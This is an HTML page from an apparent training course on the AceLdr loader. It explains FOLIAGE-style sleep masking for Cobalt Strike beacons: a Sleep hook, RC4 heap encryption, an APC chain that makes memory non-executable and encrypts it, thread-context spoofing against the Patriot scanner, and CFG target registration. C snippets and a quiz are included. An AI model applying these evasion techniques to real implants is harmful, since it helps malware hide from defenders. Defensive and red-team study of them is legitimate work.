@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: FOLIAGE Sleep Masking - AceLdr Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖥️</text></svg>">
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root{--accent:#00d4ff;--accent2:#7c3aed;--gradient:linear-gradient(135deg,#00d4ff,#7c3aed)}</style>
+</head>
+<body>
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+<nav>
+  <div class="logo">
+    <h2>AceLdr Course</h2>
+    <span>Memory Evasion Masterclass</span>
+  </div>
+  <a class="home-link" href="../AceLdr_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Windows Memory 101</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. PE File Format</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. PEB &amp; API Hashing</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Reflective Loading</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. Position-Independent Code</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module6.html"><span>6. IAT Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module7.html"><span>7. Return Addr Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link active" href="module8.html"><span>8. FOLIAGE Sleep Mask</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module9.html"><span>9. Full Chain &amp; Integration</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<h1>Module 8: FOLIAGE Sleep Masking</h1>
+<p class="subtitle">Encrypting the beacon in memory while it sleeps &mdash; the crown jewel of AceLdr's evasion</p>
+<span class="diff-badge hard">Advanced</span>
+
+<!-- ===== Section 1: The Big Idea ===== -->
+<h2>The Big Idea</h2>
+
+<div class="card highlight">
+<h4>Inspired by SecIdiot/FOLIAGE</h4>
+<p>AceLdr's sleep masking is inspired by the <strong>FOLIAGE</strong> project by SecIdiot. The core insight: Cobalt Strike beacons spend the vast majority of their lifecycle <em>sleeping</em> between check-ins. During sleep, the beacon's code and data sit in memory unencrypted &mdash; a sitting target for memory scanners. FOLIAGE solves this by encrypting the beacon's heap and changing its memory permissions <strong>before</strong> sleeping, then reversing everything upon wakeup.</p>
+</div>
+
+<p>The challenge is that you can't simply encrypt yourself and then sleep &mdash; the code performing the encryption would also be encrypted. FOLIAGE's elegant solution uses <strong>Asynchronous Procedure Calls (APCs)</strong> queued to the current thread. The APCs execute in sequence when the thread enters an alertable wait state, performing all the masking operations without the beacon's own code needing to be executing.</p>
+
+<!-- ===== Section 2: Sleep_Hook Entry Point ===== -->
+<h2>Sleep_Hook &mdash; The Entry Point</h2>
+
+<p>When the beacon calls <code>Sleep(dwMilliseconds)</code>, AceLdr's IAT hook intercepts it. The hook in <code>hooks/delay.c</code> first checks for short sleeps:</p>
+
+<pre><code><span class="lang-tag">C &mdash; hooks/delay.c</span>
+VOID WINAPI Sleep_Hook(DWORD dwMilliseconds) {
+    // Short sleep bypass: for sleeps under 1000ms, just call the
+    // real Sleep directly. FOLIAGE overhead isn't worth it for
+    // quick operational pauses (e.g., jitter calculations).
+    if (dwMilliseconds < 1000) {
+        STUB.Api.Sleep(dwMilliseconds);
+        return;
+    }
+
+    // For real sleep intervals (>= 1 second):
+    // 1. Generate a fresh RC4 encryption key
+    // 2. Encrypt the entire private heap
+    // 3. Queue the APC chain for sleep masking
+    // 4. Enter alertable wait (APCs fire, thread sleeps)
+    // 5. On wakeup: APCs decrypt heap, restore permissions
+    //    (all handled by the APC chain)
+
+    USTRING Key = { 0 };
+    generateEncryptionKey(&Key);
+
+    // Encrypt the private heap before sleeping
+    encryptHeap(&Key);
+
+    // Build and queue the APC chain, then sleep
+    foliageSleep(dwMilliseconds, &Key);
+
+    // After waking up, decrypt the heap
+    encryptHeap(&Key);  // RC4 is symmetric: encrypt again = decrypt
+}</code></pre>
+
+<div class="card warn">
+<h4>The 1000ms Threshold</h4>
+<p>Short sleeps (under 1 second) bypass the entire FOLIAGE mechanism. This is a performance optimization. The beacon frequently uses short sleeps for jitter, retry logic, and internal timing. Running the full APC chain for every sub-second sleep would add significant overhead and produce suspicious patterns of APC queuing. Only the "real" sleep intervals between C2 check-ins trigger FOLIAGE.</p>
+</div>
+
+<!-- ===== Section 3: Key Generation ===== -->
+<h2>generateEncryptionKey</h2>
+
+<p>A fresh encryption key is generated for each sleep cycle. This prevents key reuse across multiple sleep intervals, which would weaken the encryption:</p>
+
+<pre><code><span class="lang-tag">C &mdash; hooks/delay.c</span>
+VOID generateEncryptionKey(PUSTRING Key) {
+    // Allocate a 16-byte key buffer
+    Key->Length    = 16;
+    Key->MaxLength = 16;
+    Key->Buffer    = (PVOID)STUB.Api.HeapAlloc(
+                        STUB.Heap, 0, Key->MaxLength);
+
+    // Fill with random bytes using the system RNG
+    STUB.Api.RtlGenRandom(Key->Buffer, Key->Length);
+}</code></pre>
+
+<p>The key is a 16-byte random buffer used as the RC4 key for <code>SystemFunction032</code>. Using <code>RtlGenRandom</code> (the underlying function behind <code>CryptGenRandom</code>) ensures cryptographically strong randomness.</p>
+
+<!-- ===== Section 4: encryptHeap ===== -->
+<h2>encryptHeap &mdash; Walking and Encrypting</h2>
+
+<p>This function walks every allocated block on AceLdr's private heap and encrypts (or decrypts) it using RC4:</p>
+
+<pre><code><span class="lang-tag">C &mdash; hooks/delay.c</span>
+VOID encryptHeap(PUSTRING Key) {
+    PROCESS_HEAP_ENTRY Entry = { 0 };
+
+    // Lock the heap to prevent concurrent access during encryption
+    STUB.Api.RtlLockHeap(STUB.Heap);
+
+    // Walk every block on the private heap
+    while (STUB.Api.RtlWalkHeap(STUB.Heap, &Entry) == 0) {
+        // Only encrypt BUSY (allocated) blocks
+        if (Entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
+            USTRING Data;
+            Data.Length    = (USHORT)Entry.cbData;
+            Data.MaxLength = (USHORT)Entry.cbData;
+            Data.Buffer    = Entry.lpData;
+
+            // SystemFunction032 = RC4 encrypt/decrypt
+            // Since RC4 is symmetric, calling this twice with the
+            // same key encrypts then decrypts (restoring plaintext)
+            STUB.Api.SystemFunction032(&Data, Key);
+        }
+    }
+
+    STUB.Api.RtlUnlockHeap(STUB.Heap);
+}</code></pre>
+
+<h3>Why RC4 via SystemFunction032?</h3>
+
+<div class="card highlight">
+<h4>SystemFunction032 &mdash; The Undocumented RC4</h4>
+<p><code>SystemFunction032</code> is an undocumented function exported by <code>advapi32.dll</code> (internally in <code>cryptsp.dll</code>). It implements RC4 stream cipher encryption. AceLdr uses it because:</p>
+<ul>
+  <li><strong>No custom crypto code needed</strong> &mdash; Uses a Windows API, keeping the PIC shellcode small</li>
+  <li><strong>RC4 is symmetric</strong> &mdash; Encrypting with the same key twice returns the original data, simplifying the encrypt/decrypt flow</li>
+  <li><strong>Simple interface</strong> &mdash; Takes just a data buffer and a key, both as <code>USTRING</code> structures</li>
+  <li><strong>No initialization overhead</strong> &mdash; Unlike AES, RC4 needs no block padding or mode of operation</li>
+</ul>
+</div>
+
+<div class="card green">
+<h4>RC4 Symmetry Property</h4>
+<p>RC4 is a stream cipher that generates a keystream from the key and XORs it with the data. Since XOR is its own inverse (<code>A XOR K XOR K = A</code>), calling <code>SystemFunction032</code> twice with the same key first encrypts, then decrypts. This is why <code>encryptHeap</code> is called both before and after sleeping &mdash; the same function handles both directions.</p>
+</div>
+
+<!-- ===== Section 5: The APC Chain ===== -->
+<h2>The 10-Step APC Chain</h2>
+
+<p>The heart of FOLIAGE is a chain of <strong>10 APCs</strong> queued to the current thread. These APCs execute in FIFO (first-in, first-out) order when the thread enters an alertable wait state via <code>NtWaitForSingleObject</code>.</p>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:20px;">FOLIAGE APC Chain (APCs 0-9)</h4>
+
+  <table>
+    <thead>
+      <tr><th>#</th><th>APC Function</th><th>Action</th><th>Purpose</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>0</strong></td>
+        <td><code>NtWaitForSingleObject</code></td>
+        <td>Wait on timer (sleep duration)</td>
+        <td>The actual sleep &mdash; thread is suspended for the requested interval</td>
+      </tr>
+      <tr>
+        <td><strong>1</strong></td>
+        <td><code>NtGetContextThread</code></td>
+        <td>Capture thread context (via trampoline)</td>
+        <td>Save RSP, RIP, etc. before masking &mdash; used for Patriot evasion</td>
+      </tr>
+      <tr>
+        <td><strong>2</strong></td>
+        <td><code>NtSetContextThread</code></td>
+        <td>Set RIP to legitimate wait location</td>
+        <td>Make thread appear to be sleeping inside ntdll, not in beacon code</td>
+      </tr>
+      <tr>
+        <td><strong>3</strong></td>
+        <td><code>NtProtectVirtualMemory</code></td>
+        <td>Change beacon memory to <code>RW</code></td>
+        <td>Remove execute permission &mdash; beacon code becomes non-executable data</td>
+      </tr>
+      <tr>
+        <td><strong>4</strong></td>
+        <td><code>SystemFunction032</code></td>
+        <td>Encrypt beacon code with RC4</td>
+        <td>Beacon code is now encrypted AND non-executable</td>
+      </tr>
+      <tr>
+        <td><strong>5</strong></td>
+        <td><code>NtWaitForSingleObject</code></td>
+        <td>Wait on timer (sleep duration)</td>
+        <td>The actual sleep happens here with beacon fully masked</td>
+      </tr>
+      <tr>
+        <td><strong>6</strong></td>
+        <td><code>SystemFunction032</code></td>
+        <td>Decrypt beacon code with RC4</td>
+        <td>Restore beacon code to plaintext</td>
+      </tr>
+      <tr>
+        <td><strong>7</strong></td>
+        <td><code>NtProtectVirtualMemory</code></td>
+        <td>Change beacon memory back to <code>RX</code></td>
+        <td>Restore execute permission so beacon can run again</td>
+      </tr>
+      <tr>
+        <td><strong>8</strong></td>
+        <td><code>NtSetContextThread</code></td>
+        <td>Restore original thread context (via trampoline)</td>
+        <td>RIP points back to beacon code &mdash; used for Patriot evasion</td>
+      </tr>
+      <tr>
+        <td><strong>9</strong></td>
+        <td><code>NtSetEvent</code></td>
+        <td>Signal completion event</td>
+        <td>Signals that the chain is complete so the outer wait can finish</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<h3>Visualizing the Chain</h3>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:15px;">APC Execution Flow</h4>
+  <div class="flow">
+    <div class="box y">APC 0<br><small>Wait (setup)</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box">APC 1<br><small>Get context</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box">APC 2<br><small>Spoof context</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box r">APC 3<br><small>RX &rarr; RW</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box r">APC 4<br><small>Encrypt code</small></div>
+  </div>
+  <div class="flow" style="margin-top:12px;">
+    <div class="box hl">APC 5<br><small>SLEEP (masked)</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">APC 6<br><small>Decrypt code</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">APC 7<br><small>RW &rarr; RX</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box">APC 8<br><small>Restore context</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">APC 9<br><small>Signal done</small></div>
+  </div>
+</div>
+
+<!-- ===== Section 6: Why APCs? ===== -->
+<h2>Why Use APCs Instead of Direct Calls?</h2>
+
+<div class="card highlight">
+<h4>The Self-Encryption Problem</h4>
+<p>Consider what happens if you try to encrypt yourself directly:</p>
+<ol>
+  <li>You call <code>SystemFunction032</code> to encrypt the beacon's memory region</li>
+  <li>But the code calling <code>SystemFunction032</code> <strong>is inside that memory region</strong></li>
+  <li>After encryption, the next instruction to execute is now encrypted garbage</li>
+  <li>The program crashes</li>
+</ol>
+<p>APCs solve this elegantly. All APC functions (<code>NtProtectVirtualMemory</code>, <code>SystemFunction032</code>, etc.) live in <strong>ntdll.dll or advapi32.dll</strong> &mdash; system DLLs that are NOT part of the beacon's memory. When the thread enters an alertable wait, the kernel's APC dispatcher (inside ntdll) dequeues and executes each APC in order. The beacon's own code never needs to execute during the masking process.</p>
+</div>
+
+<!-- ===== Section 7: Patriot Evasion ===== -->
+<h2>Patriot Evasion via JMP RBX Trampoline</h2>
+
+<p>The <strong>Patriot</strong> tool detects sleeping beacons by inspecting the thread's saved context (particularly RIP) to see if it points to suspicious memory. FOLIAGE counters this on APCs 1 and 8:</p>
+
+<div class="card warn">
+<h4>The Patriot Problem</h4>
+<p>When a thread sleeps, its context is saved. If a tool calls <code>NtGetContextThread</code> on a sleeping beacon thread, it sees that RIP points into unbacked memory &mdash; proof that the thread was executing beacon code. Even with the beacon encrypted, the saved context reveals its presence.</p>
+</div>
+
+<h3>The Solution: Context Spoofing</h3>
+
+<p>APCs 1 and 8 in the chain handle this by using the <code>JMP [RBX]</code> trampoline (the same gadget from Module 7) as an intermediary for <code>NtGetContextThread</code> and <code>NtSetContextThread</code>:</p>
+
+<pre><code><span class="lang-tag">Pseudocode &mdash; Patriot evasion</span>
+// APC 1: Capture context through trampoline
+//   - NtGetContextThread is called through the JMP RBX gadget
+//   - The captured context shows RIP at the gadget (in a legit DLL)
+//   - This context is saved for later restoration
+
+// APC 2: Set spoofed context
+//   - NtSetContextThread sets RIP to point inside ntdll
+//     (e.g., NtWaitForSingleObject + some offset)
+//   - Now if Patriot inspects the thread during sleep,
+//     RIP appears to be inside ntdll = legitimate
+
+// APC 8: Restore original context through trampoline
+//   - NtSetContextThread restores the saved context from APC 1
+//   - RIP is set back to the beacon code, ready to resume</code></pre>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:15px;">Thread Context During Sleep</h4>
+  <div class="flow">
+    <div class="box r">Before Masking<br><small>RIP = beacon code<br>(suspicious)</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">APCs 1-2<br><small>Save &amp; spoof<br>thread context</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">During Sleep<br><small>RIP = ntdll.dll<br>(legitimate)</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">APC 8<br><small>Restore real<br>context</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">After Wakeup<br><small>RIP = beacon code<br>(running again)</small></div>
+  </div>
+</div>
+
+<!-- ===== Section 8: CFG Handling ===== -->
+<h2>CFG (Control Flow Guard) Handling</h2>
+
+<p>Windows Control Flow Guard (CFG) validates indirect call targets against a bitmap of approved addresses. Since APC dispatch involves indirect calls, AceLdr needs to register its hook functions as valid CFG targets:</p>
+
+<pre><code><span class="lang-tag">C &mdash; cfg handling</span>
+// Before queuing APCs, register the trampoline as a valid
+// CFG call target. Without this, CFG-enforced processes would
+// terminate the thread when APC dispatch tries to call through
+// an unregistered address.
+
+PVOID  CfgAddr  = C_PTR(TrampolineFunc);
+SIZE_T CfgSize  = sizeof(PVOID);
+
+// NtSetInformationVirtualMemory with VmCfgCallTargetInformation
+// adds our trampoline to the CFG bitmap
+STUB.Api.NtSetInformationVirtualMemory(
+    NtCurrentProcess(),
+    VmCfgCallTargetInformation,
+    1,
+    &CfgAddr,
+    &CfgInfo,
+    sizeof(CfgInfo)
+);</code></pre>
+
+<div class="card green">
+<h4>Why CFG Matters</h4>
+<p>Many modern processes run with CFG enabled. If AceLdr queues an APC whose target address isn't in the CFG bitmap, the APC dispatch will trigger a CFG violation &mdash; crashing the process. By calling <code>NtSetInformationVirtualMemory</code> with <code>VmCfgCallTargetInformation</code>, AceLdr adds its trampoline function as a valid call target, allowing the APC chain to execute without triggering CFG enforcement.</p>
+</div>
+
+<!-- ===== Section 9: Putting It All Together ===== -->
+<h2>The Complete Sleep Cycle</h2>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:20px;">Full FOLIAGE Sleep Sequence</h4>
+  <div class="flow">
+    <div class="box y">Beacon calls<br><code>Sleep(60000)</code></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">Sleep_Hook<br>intercepts</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box">Generate<br>RC4 key</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box r">Encrypt<br>private heap</div>
+  </div>
+  <div class="flow" style="margin-top:12px;">
+    <div class="box">Queue 10<br>APCs</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">Enter alertable<br>wait</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box r">APCs: mask code<br>+ spoof context</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box" style="border-color:var(--accent);"><strong>SLEEP</strong><br>(fully masked)</div>
+  </div>
+  <div class="flow" style="margin-top:12px;">
+    <div class="box g">APCs: decrypt<br>+ restore</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Decrypt<br>private heap</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">Beacon<br>resumes</div>
+  </div>
+</div>
+
+<p>During the masked sleep window, a memory scanner sees:</p>
+<ul>
+  <li><strong>No executable beacon code</strong> &mdash; Memory permissions are <code>RW</code>, not <code>RX</code> or <code>RWX</code></li>
+  <li><strong>No beacon signatures</strong> &mdash; Code and heap data are RC4-encrypted</li>
+  <li><strong>No suspicious thread context</strong> &mdash; RIP points into <code>ntdll.dll</code></li>
+  <li><strong>No beacon strings on the heap</strong> &mdash; The private heap is separately encrypted</li>
+</ul>
+
+<!-- ===== Quiz ===== -->
+<h2>Knowledge Check</h2>
+
+<div class="quiz" id="quiz8">
+  <h4>Module 8 Quiz</h4>
+
+  <div class="quiz-q" data-correct="0">
+    <p>1. When does AceLdr encrypt the private heap relative to the APC chain?</p>
+    <label data-opt="0"><input type="radio" name="q8_1"> Before the APC chain &mdash; the heap is encrypted in <code>Sleep_Hook</code> before queuing APCs</label>
+    <label data-opt="1"><input type="radio" name="q8_1"> During the APC chain &mdash; one of the 10 APCs handles heap encryption</label>
+    <label data-opt="2"><input type="radio" name="q8_1"> After the APC chain &mdash; heap encryption happens on wakeup</label>
+    <label data-opt="3"><input type="radio" name="q8_1"> The heap is never encrypted &mdash; only the beacon code region is encrypted</label>
+    <div class="explain">The private heap is encrypted <strong>before</strong> the APC chain is queued, directly in <code>Sleep_Hook</code> via <code>encryptHeap(&Key)</code>. The APC chain handles encrypting the beacon's <strong>code region</strong> (which is a separate concern). After wakeup, <code>encryptHeap</code> is called again with the same key to decrypt (RC4 symmetry).</div>
+  </div>
+
+  <div class="quiz-q" data-correct="2">
+    <p>2. Why can AceLdr use the same <code>encryptHeap</code> function for both encryption and decryption?</p>
+    <label data-opt="0"><input type="radio" name="q8_2"> It uses AES-CBC which has separate encrypt/decrypt modes toggled by a flag</label>
+    <label data-opt="1"><input type="radio" name="q8_2"> The function checks a global boolean to decide whether to encrypt or decrypt</label>
+    <label data-opt="2"><input type="radio" name="q8_2"> RC4 is a symmetric stream cipher &mdash; XORing with the same keystream twice restores the original data</label>
+    <label data-opt="3"><input type="radio" name="q8_2"> The encryption key is inverted for decryption</label>
+    <div class="explain">RC4 generates a keystream and XORs it with the data. Since XOR is self-inverse (A ^ K ^ K = A), applying RC4 twice with the same key first encrypts, then decrypts. This is why <code>encryptHeap</code> is called with the same key before sleep (encrypt) and after wakeup (decrypt).</div>
+  </div>
+
+  <div class="quiz-q" data-correct="1">
+    <p>3. What does the thread context look like to a scanner during the masked sleep?</p>
+    <label data-opt="0"><input type="radio" name="q8_3"> RIP points to the beacon's <code>Sleep_Hook</code> function</label>
+    <label data-opt="1"><input type="radio" name="q8_3"> RIP points inside <code>ntdll.dll</code>, appearing as a legitimate wait</label>
+    <label data-opt="2"><input type="radio" name="q8_3"> RIP is set to NULL to hide the thread's location</label>
+    <label data-opt="3"><input type="radio" name="q8_3"> RIP points to <code>kernel32.dll!Sleep</code></label>
+    <div class="explain">APC 2 in the chain uses <code>NtSetContextThread</code> to set RIP to a location inside <code>ntdll.dll</code> (such as an offset within <code>NtWaitForSingleObject</code>). This makes the thread appear to be legitimately waiting inside a system call. Tools like Patriot that inspect sleeping thread contexts will see ntdll as the instruction pointer, not suspicious beacon memory.</div>
+  </div>
+
+  <button class="quiz-btn" onclick="gradeQuiz('quiz8')">Check Answers</button>
+  <div class="quiz-result"></div>
+</div>
+
+<!-- ===== Navigation ===== -->
+<div class="nav-btns">
+  <a href="module7.html">&larr; Module 7: Return Addr Spoofing</a>
+  <a href="module9.html" class="primary">Module 9: Full Chain &amp; Integration &rarr;</a>
+</div>
+</main>
+
+<script src="../../assets/course.js"></script>
+</body>
+</html>
